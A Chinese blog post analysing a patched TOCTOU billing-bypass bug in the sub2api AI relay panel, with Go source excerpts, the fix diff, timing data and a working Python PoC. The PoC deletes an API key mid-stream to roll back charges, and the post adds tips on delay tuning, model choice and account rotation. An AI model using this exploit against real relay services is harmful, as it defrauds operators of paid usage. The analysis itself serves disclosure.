---
title: sub2api 计费绕过：一个 TOCTOU 竞态如何把账单清零
date: 2026-10-02 19:40:00
tags: [安全, 漏洞分析, TOCTOU, Go, PostgreSQL, 竞态条件, sub2api]
categories: [技术分享]
description: 复盘 sub2api 中转站的计费绕过漏洞。根因是同一个事务里扣余额在前、累加 Key 配额在后，后者依赖 api_keys 行存在；请求结束后抢先软删 Key，让后者报 ErrAPIKeyNotFound，整个事务回滚，已扣的余额一并撤销。含源码级分析、补丁 diff、实测时序数据与完整利用
---

水群的时候看有大佬发了一个中转bug报告，我研究了一下还真实现出来无限使用的脚本了，不过现在已经修复了，可惜，国庆节也那么积极服了

---

# 一、目标是什么

sub2api 是一套开源的 AI API 中转面板，Go 写的后端 + PostgreSQL，前端是 Vue。它做的事情就是：把上游各家（OpenAI / Anthropic / Gemini / Grok）的账号聚成一个池子，对外暴露统一接口，用户拿它签发的 Key 来调用，按量扣钱。

<img src="https://pub-7843c36ae8c74acbb64998494a352f61.r2.dev/picgo/20261003132752973.png" alt="漏洞报告" style="zoom:50%;" />

<img src="https://pub-7843c36ae8c74acbb64998494a352f61.r2.dev/picgo/20261003132759837.png" alt="中转计费" style="zoom:50%;" />

对外接口是标准的：

```text
POST /v1/chat/completions     # OpenAI 兼容
POST /v1/messages             # Anthropic 兼容
POST /v1/responses            # OpenAI Responses
POST /v1/embeddings
POST /v1/images/generations
```

用户侧有两套鉴权：

| 用途 | 凭据 | 头 |
|---|---|---|
| 面板操作（建 Key、查余额、兑换卡密） | 登录 JWT | `Authorization: Bearer <jwt>` |
| 调模型 | 面板签发的 API Key | `Authorization: Bearer sk-xxx` |

计费模式有三种：**余额扣费**（standard）、**订阅配额**、以及 **Key 自身的 quota 限额**。这三样在落账时都要更新。

---

# 二、正常的计费流程长什么样

一次请求的完整链路：

```text
客户端 → 网关鉴权 → 选账号 → 转发上游 → 拿 usage → 落账 → 返回
                                        ↑
                                  这里才扣钱
```

注意最后一步：**扣钱发生在响应体读完之后**。因为只有拿到上游返回的 token 用量，才知道该扣多少。

落账的入口在 `backend/internal/service/gateway_usage_billing.go`：

```go
func applyUsageBilling(ctx context.Context, requestID string, usageLog *UsageLog,
    p *postUsageBillingParams, deps *billingDeps, repo UsageBillingRepository) (bool, error) {

    cmd := buildUsageBillingCommand(requestID, usageLog, p)
    if cmd == nil || cmd.RequestID == "" || repo == nil {
        postUsageBilling(ctx, p, deps)   // 降级兜底路径
        return true, nil
    }

    billingCtx, cancel := detachedBillingContext(ctx)
    defer cancel()

    result, err := repo.Apply(billingCtx, cmd)   // ← 真正落账
    if err != nil {
        return false, err
    }
    ...
}
```

再往下是 `backend/internal/repository/usage_billing_repo.go` 的 `Apply`，一个标准的事务包裹：

```go
func (r *usageBillingRepository) Apply(ctx context.Context, cmd *service.UsageBillingCommand) (*service.UsageBillingApplyResult, error) {
    tx, err := r.db.BeginTx(ctx, nil)
    if err != nil {
        return nil, err
    }
    defer func() {
        if tx != nil {
            _ = tx.Rollback()        // ← 出错就整体回滚
        }
    }()

    // 1) 请求级去重（幂等闸）
    applied, err := r.claimUsageBillingKey(ctx, tx, cmd)
    if err != nil {
        return nil, err
    }
    if !applied {
        return &service.UsageBillingApplyResult{Applied: false}, nil
    }

    // 2) 扣钱 + 记账
    result := &service.UsageBillingApplyResult{Applied: true}
    if err := r.applyUsageBillingEffects(ctx, tx, cmd, result); err != nil {
        return nil, err
    }

    if err := tx.Commit(); err != nil {
        return nil, err
    }
    tx = nil
    return result, nil
}
```

到这里都挺正常。**问题出在第 2 步 `applyUsageBillingEffects` 里面。**

---

# 三、根因：同一个事务里，扣钱在前、记账在后

把 `applyUsageBillingEffects` 摊开看（**漏洞版本**）：

```go
func (r *usageBillingRepository) applyUsageBillingEffects(ctx context.Context, tx *sql.Tx,
    cmd *service.UsageBillingCommand, result *service.UsageBillingApplyResult) error {

    // ① 订阅用量累加
    if cmd.SubscriptionCost > 0 && cmd.SubscriptionID != nil {
        if err := incrementUsageBillingSubscription(ctx, tx, *cmd.SubscriptionID, cmd.SubscriptionCost); err != nil {
            return err
        }
    }

    // ② 扣用户余额  ← 先扣钱
    if cmd.BalanceCost > 0 {
        newBalance, sufficient, err := deductUsageBillingBalance(ctx, tx, cmd.UserID, cmd.BalanceCost)
        if err != nil {
            return err
        }
        result.NewBalance = &newBalance
        result.BalanceOverdrafted = !sufficient
    }

    // ③ 累加 Key 自身配额  ← 后记账，依赖 api_keys 行存在
    if cmd.APIKeyQuotaCost > 0 {
        exhausted, err := incrementUsageBillingAPIKeyQuota(ctx, tx, cmd.APIKeyID, cmd.APIKeyQuotaCost)
        if err != nil {
            return err                      // ★ 这里
        }
        result.APIKeyQuotaExhausted = exhausted
    }

    // ④ 累加 Key 限速用量
    if cmd.APIKeyRateLimitCost > 0 {
        if err := incrementUsageBillingAPIKeyRateLimit(ctx, tx, cmd.APIKeyID, cmd.APIKeyRateLimitCost); err != nil {
            return err                      // ★ 还有这里
        }
    }

    // ⑤ 账号配额
    if cmd.AccountQuotaCost > 0 && (...) {
        ...
    }

    return nil
}
```

关键在 ③ 和 ④ 的实现。它们都是 `UPDATE api_keys ... WHERE id = $2 AND deleted_at IS NULL`：

```go
func incrementUsageBillingAPIKeyQuota(ctx context.Context, tx *sql.Tx, apiKeyID int64, amount float64) (bool, error) {
    var exhausted bool
    err := tx.QueryRowContext(ctx, `
        UPDATE api_keys
        SET quota_used = quota_used + $1,
            status = CASE ... END,
            updated_at = NOW()
        WHERE id = $2 AND deleted_at IS NULL     -- ← 只看未删除的行
        RETURNING quota > 0 AND quota_used >= quota AND quota_used - $1 < quota
    `, amount, apiKeyID, ...).Scan(&exhausted)

    if errors.Is(err, sql.ErrNoRows) {
        return false, service.ErrAPIKeyNotFound   // ← Key 不存在/已删，报错
    }
    ...
}

func incrementUsageBillingAPIKeyRateLimit(ctx context.Context, tx *sql.Tx, apiKeyID int64, cost float64) error {
    res, err := tx.ExecContext(ctx, `
        UPDATE api_keys SET usage_5h = ..., usage_1d = ..., usage_7d = ...
        WHERE id = $2 AND deleted_at IS NULL
    `, cost, apiKeyID)
    ...
    if affected == 0 {
        return service.ErrAPIKeyNotFound          // ← 同上
    }
    return nil
}
```

于是链条闭合了：

```text
扣余额（②）已经写进事务
      ↓
累加 Key 配额（③）UPDATE 命中 0 行
      ↓
返回 ErrAPIKeyNotFound
      ↓
applyUsageBillingEffects 直接 return err
      ↓
Apply 里 return nil, err
      ↓
defer 里的 tx.Rollback()
      ↓
② 扣掉的余额被一起撤销  →  这单白嫖
```

**这就是根因：扣钱和记账在同一个事务里，但顺序是「先扣钱、后记账」，而记账那一步依赖于 Key 行仍然存在。** 把 Key 删掉，记账失败，事务回滚，钱就退回来了。

顺带说一句，`Apply` 的第一步 `claimUsageBillingKey` 其实只是个**请求级幂等去重**，往 `usage_billing_dedup` 插一条 `(request_id, api_key_id)`，跟这个漏洞没关系 —— 它也在同一个事务里，回滚时一起被撤销了。所以别指望用 `X-Client-Request-ID` 之类的请求头去撞去重表：`request_id` 是服务端生成的 UUID，客户端控制不了。

---

# 四、利用：抢在落账之前把 Key 删掉

既然根因是「落账时 Key 必须还在」，那利用思路就很直接了：

> **请求发出去之后、落账开始之前，把 Key 删掉。**

时序窗口在这里：

```text
t0  ├─ 建一个带 quota 的临时 Key
t1  ├─ 用它发起一个长流式请求（stream=true）
    │        ↓ 上游开始吐 token（这期间 Key 必须还在，否则鉴权就挂了）
t2  ├─ 请求还在途，面板上调 DELETE /api/v1/keys/{id}   ★ 抢跑
    │        ↓ api_keys.deleted_at = NOW()
t3  ├─ 上游跑完，返回 usage
t4  └─ 服务端落账：扣余额 ✅ → 累加 Key 配额 ❌ ErrAPIKeyNotFound → 事务回滚
    └─ 余额零变化
```

注意 t2 的位置很讲究：**必须等请求已经通过鉴权、上游已经开始生成之后再删**。删早了，网关鉴权那一步就直接 401 了。

面板的删除接口是软删，而且会顺手把 key 字段写成 tombstone：

```sql
SET key = $1, deleted_at = NOW(), updated_at = NOW()
WHERE id = $2 AND deleted_at IS NULL
```

所以删掉的 Key 立刻不能再用于鉴权 —— 这正好，反正后面也不用它了。

## PoC 核心逻辑

去掉参数解析和日志之后，利用逻辑就这么多：

```python
import threading, time, requests

BASE = "https://target.example"

def create_key(jwt, group_id, quota=1.0):
    """建一个带 quota 的临时 Key，返回 (key_id, secret)"""
    r = requests.post(f"{BASE}/api/v1/keys",
                      headers={"Authorization": f"Bearer {jwt}"},
                      json={"name": "tmp", "group_id": group_id, "quota": quota})
    d = r.json()["data"]
    return d["id"], d["key"]          # 明文 key 只在创建时返回一次

def delete_key(jwt, key_id):
    requests.delete(f"{BASE}/api/v1/keys/{key_id}",
                    headers={"Authorization": f"Bearer {jwt}"})

def exploit(jwt, group_id, model, delete_after=0.15):
    bal_before = get_balance(jwt)

    key_id, secret = create_key(jwt, group_id, quota=1.0)

    # 抢跑删除：请求派发后 N 秒就删，不等响应头
    def killer():
        time.sleep(delete_after)
        delete_key(jwt, key_id)

    threading.Thread(target=killer, daemon=True).start()

    # 长流式请求，务必 stream=true —— 落账在响应读完之后
    with requests.post(f"{BASE}/v1/chat/completions",
                       headers={"Authorization": f"Bearer {secret}"},
                       json={"model": model, "stream": True,
                             "max_tokens": 4096,
                             "messages": [{"role": "user", "content": "写一篇 2000 字的长文"}]},
                       stream=True, timeout=600) as r:
        for _ in r.iter_lines():
            pass                       # 把流读干净，让服务端走到落账

    time.sleep(5)                      # 等异步落账完成
    bal_after = get_balance(jwt)

    print(f"余额 {bal_before} -> {bal_after}  (变化 {bal_after - bal_before})")
    return bal_after - bal_before
```

跑出来余额变化是 `0`，同时 `/api/v1/usage` 里能看到这次请求的记录 —— **调用记录在，钱没扣**。

---

# 五、不是所有模型都能绕

这是这个漏洞最有意思的地方 —— **它挑模型。**

同一套利用代码，换个模型结果就完全不一样：

| 模型 | 实测耗时 | 结果 |
|---|---|---|
| deepseek 系列（g98） | 4.4 – 8.0s | **照常扣费** |
| grok-4.x（g69） | 4.4 – 8.0s | **照常扣费** |
| gemini-image（g95） | 4.4 – 8.0s | **照常扣费** |
| claude 系列（g87） | 4.4 – 8.0s | **照常扣费** |
| gpt-5.5 / gpt-5.6-sol | 20 – 112s | **零扣费** |
| gpt-6 | 20 – 112s | **零扣费** |
| glm-4.5 | 20 – 112s | **零扣费** |

原因很简单：**落账发生在响应结束之后。** 请求跑得越快，落账来得越早，抢跑删除就越容易输给落账事务。

- 快模型 4~8 秒跑完 → 你还在等删 Key 的网络往返，事务已经 Commit 了 → 照常扣费
- 慢模型 20 秒以上 → 有充足时间把 Key 删掉 → 事务回滚 → 免单

所以「抢跑删除」的延迟得调：等响应头再删基本必输，得**请求一派发就开始计时**。实战里 `0.15 ~ 0.3s` 这个区间比较稳。

**但这里有个反噬：如果抢跑输了，钱就真扣了。** 而扣余额的 SQL 是允许透支的：

```go
func deductUsageBillingBalance(ctx context.Context, tx *sql.Tx, userID int64, amount float64) (float64, bool, error) {
    // 第一段：够扣就正常扣
    err := tx.QueryRowContext(ctx, `
        UPDATE users SET balance = balance - $1, updated_at = NOW()
        WHERE id = $2 AND deleted_at IS NULL AND balance >= $1
        RETURNING balance
    `, amount, userID).Scan(&newBalance)
    if err == nil {
        return newBalance, true, nil
    }
    if !errors.Is(err, sql.ErrNoRows) {
        return 0, false, err
    }

    // 第二段：不够扣也照扣，标记为透支
    err = tx.QueryRowContext(ctx, `
        UPDATE users SET balance = balance - $1, updated_at = NOW()
        WHERE id = $2 AND deleted_at IS NULL
        RETURNING balance
    `, amount, userID).Scan(&newBalance)
    ...
    return newBalance, false, nil     // sufficient = false
}
```

第二段没有余额下限校验，`sufficient=false` 只是返回给上层记个 `BalanceOverdrafted` 标记。**也就是说，一直漏费会把余额一路扣成负数。** 我就是这么把自己的号打成 `-0.0123884` 的。

---

# 六、官方怎么修的：就差一个 `&&`

对比修复版本（0.2.13）和漏洞版本（0.1.176）的同一个函数，diff 只有两处：

```diff
     if cmd.APIKeyQuotaCost > 0 {
         exhausted, err := incrementUsageBillingAPIKeyQuota(ctx, tx, cmd.APIKeyID, cmd.APIKeyQuotaCost)
-        if err != nil {
+        if err != nil && !errors.Is(err, service.ErrAPIKeyNotFound) {
             return err
         }
         result.APIKeyQuotaExhausted = exhausted
     }
 
     if cmd.APIKeyRateLimitCost > 0 {
-        if err := incrementUsageBillingAPIKeyRateLimit(ctx, tx, cmd.APIKeyID, cmd.APIKeyRateLimitCost); err != nil {
+        if err := incrementUsageBillingAPIKeyRateLimit(ctx, tx, cmd.APIKeyID, cmd.APIKeyRateLimitCost); err != nil && !errors.Is(err, service.ErrAPIKeyNotFound) {
             return err
         }
     }
```

官方还顺手加了条注释，等于承认了这个问题：

```go
// Key 已不存在时跳过其自身的额度/限速计数，其余结算项不受影响。
```

**修法就是：把「Key 不存在」从致命错误降级成可忽略错误。** Key 没了就不记它的配额，但余额该扣还是扣，事务正常提交。

这个修法很精准 —— 它没有去动「扣钱在前、记账在后」的顺序，而是直接消除了「记账失败导致整体回滚」这个后果。换句话说，**顺序问题还在，只是不再有可利用的后果了**。

---

# 七、三个前提条件，缺一不可

想复现这个漏洞，下面三条必须同时成立：

### 1. 临时 Key 必须带 quota（`quota > 0`）

这是最容易忽略的一条。看 `shouldDeductAPIKeyQuota`：

```go
func (p *postUsageBillingParams) shouldDeductAPIKeyQuota() bool {
    return p.Cost.ActualCost > 0 && p.APIKey.Quota > 0 && p.APIKeyService != nil
}
```

`p.APIKey.Quota > 0` 是硬条件。**建 Key 时如果不填 quota（或者填 0，代表不限额），`APIKeyQuotaCost` 就是 0，`applyUsageBillingEffects` 压根不会去碰 `api_keys` 表，也就永远不会报 `ErrAPIKeyNotFound`** —— 漏洞直接失效。

所以建 Key 的 payload 里那个 `quota` 字段不是可选项，它是**触发回滚的开关**：

```python
{"name": "tmp", "group_id": 74, "quota": 1.0}
```

### 2. 账号余额必须大于 0

这个是我踩得最惨的坑。余额变成负数之后，整个账号会被**网关鉴权中间件**直接拦死：

```go
// backend/internal/server/middleware/api_key_auth.go
func apiKeyBalanceBelowAuthThreshold(balance float64, _ *config.Config) bool {
    return balance <= 0
}
```

实测覆盖面（余额 `-0.0123884` 时逐条打）：

| 路由 | 结果 |
|---|---|
| `GET /v1/models` | 403 `INSUFFICIENT_BALANCE` |
| `POST /v1/chat/completions` | 403 |
| `POST /v1/messages` | 403 |
| `POST /v1/responses` | 403 |
| `POST /v1/embeddings` | 403 |
| `POST /v1/images/generations` | 403 |
| `POST /v1beta/models/*`（Gemini 原生） | 403 |
| `GET /v1/usage` | 200（唯一放行的只读路由） |

**所有生成类路由全军覆没，没有漏网的。**

这点必须想清楚：**这个漏洞能实现的是「不扣钱」，不是「负余额也能用」。** 它是给你省钱的，不是给你救命的。想用就得先把余额维持成正数 —— 这也是为什么「漏费即停服」的护栏很重要。

### 3. 建 Key 有频率配额，它就是吞吐天花板

利用要「一请求一 Key」，那就得考虑建 Key 的频率限制：

```text
apikey:create_count:<userID>   Redis 固定 1 小时窗口
```

默认 60 次/小时/账号。**删 Key 不会退还次数**（用 `ExpireNX` 设 TTL，只在首次 INCR 时生效，所以轮询等窗口是安全的，不会把窗口往后推）。

于是绕过模式的吞吐上限就是 60 请求/小时。想提高只能多账号轮换，因为计数键是按 `userID` 隔离的。

# 八、总结

把整条链子压缩成一句话：

> **扣钱和记账写在同一个事务里，扣钱在前、记账在后；记账那一步要求 Key 行还存在。请求在途时把 Key 软删，记账报 `ErrAPIKeyNotFound`，事务回滚，已经把扣掉的余额一起撤销了。**

---

> 作者：NowPion
